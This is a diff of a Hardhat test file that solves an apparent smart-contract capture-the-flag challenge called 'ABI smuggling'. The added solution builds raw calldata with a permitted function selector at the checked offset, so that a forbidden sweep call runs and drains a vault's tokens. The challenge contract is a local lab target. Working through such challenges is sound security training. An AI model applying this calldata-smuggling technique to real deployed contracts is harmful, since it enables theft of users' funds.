@@ -34,6 +34,7 @@ describe('[Challenge] ABI smuggling', function () {
 
         const deployerPermission = await vault.getActionId('0x85fb709d', deployer.address, vault.address);
         const playerPermission = await vault.getActionId('0xd9caed12', player.address, vault.address);
+        console.log({ playerPermission });
         await vault.setPermissions([deployerPermission, playerPermission]);
         expect(await vault.permissions(deployerPermission)).to.be.true;
         expect(await vault.permissions(playerPermission)).to.be.true;
@@ -59,8 +60,34 @@ describe('[Challenge] ABI smuggling', function () {
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
 
-        const victim = await (await ethers.getContractFactory('TestVictim', deployer)).deploy();
-        await (await ethers.getContractFactory('AttackerAbi', deployer)).deploy(victim.address);
+        await ethers.provider.send("evm_increaseTime", [20 * 24 * 60 * 60]);
+
+        const args = ethers.utils.defaultAbiCoder.encode(["address", "address", "uint256"], [token.address, recovery.address, 1000]);
+        const calldata = "0xd9caed12" + args.slice(2);
+
+        const hackData = [
+            // outer call
+            "0x1cff79cd",
+            "000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f0512",
+            "0000000000000000000000000000000000000000000000000000000000000064",
+            "0000000000000000000000000000000000000000000000000000000000000000",
+            "d9caed12",
+
+            // inner call
+            "0000000000000000000000000000000000000000000000000000000000000044",
+            "85fb709d",
+            "0000000000000000000000003c44cdddb6a900fa2b585dd299e03d12fa4293bc",
+            "0000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa3"]
+
+        // idk why provider.call did not work
+        await player.sendTransaction({
+            from: player.address,
+            to: vault.address,
+            data: hackData.join(''),
+            gasLimit: 5000000,
+        });
+
+        // await vault.connect(player).execute(vault.address, calldata);
     });
 
     after(async function () {
